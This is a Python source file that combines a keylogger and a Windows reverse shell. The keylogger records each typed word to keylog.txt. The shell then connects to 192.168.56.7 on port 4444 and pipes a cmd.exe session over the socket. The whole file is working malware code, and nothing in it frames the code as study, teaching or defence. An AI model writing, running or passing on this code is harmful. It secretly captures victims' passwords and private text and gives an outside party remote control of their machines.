#!/usr/bin/env python3
# Import necessary libraries
from pynput.keyboard import Key, Listener
import logging
import socket,subprocess,threading
# Initialize Log File
logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s - %(message)s")
# Initialize Variable
word=''
# Whenever a key is pressed:
def on_press(key):
    global word

# If the key is a space or the enter key, log the word go to the next line
    if key == Key.space or key == Key.enter or key == Key.tab:
        word += ' '
        logging.info(str(word))
        # Resets the word variable
        word = ''
    # If an arrow key is pressed, log the word, and the string below
    elif key == Key.up or key == Key.down or key == Key.left or key == Key.right:
        word += ' '
        logging.info(str(word + '-An arrow key was pressed-'))
        word =''
    # If the key pressed is a shift key, ignore it
    elif key == Key.shift_l or key == Key.shift_r:
        return
    # If either control key is pressed, ignore it
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        return
    # If either command/super key is pressed, ignore it
    elif key == Key.cmd_l or key == Key.cmd_r:
        return
    # If backspace is pressed, remove the last character from the word variable
    elif key == Key.backspace:
        word = word[:-1]
    # Add the key pressed to the end of the word variable and remove the quotes around it for readability
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    # If the escape key pressed, stop the program
    if key == Key.esc:
        return False

# Calls on the on_press function and keeps it running
with Listener(on_press=on_press) as listener:
    listener.join()

# Windows reverse shell
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.7",4444))

p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()